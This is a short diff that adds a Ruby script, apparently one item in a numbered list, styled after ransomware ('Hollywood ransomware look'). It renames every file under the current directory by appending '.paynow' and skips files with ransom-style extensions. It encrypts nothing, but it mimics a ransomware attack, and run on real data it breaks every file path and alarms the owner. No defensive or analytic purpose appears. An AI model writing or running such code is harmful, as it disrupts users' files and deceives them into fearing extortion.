@@ -1,0 +1,5 @@
+# 5. mini extension swapper — Hollywood ransomware look
+Dir.glob("**/*").select(&File.method(:file?)).each do |f|
+  next if f =~ /\.(enc|locked|cript|pay|bitcoin)$/i
+  File.rename(f, f + ".paynow")
+end
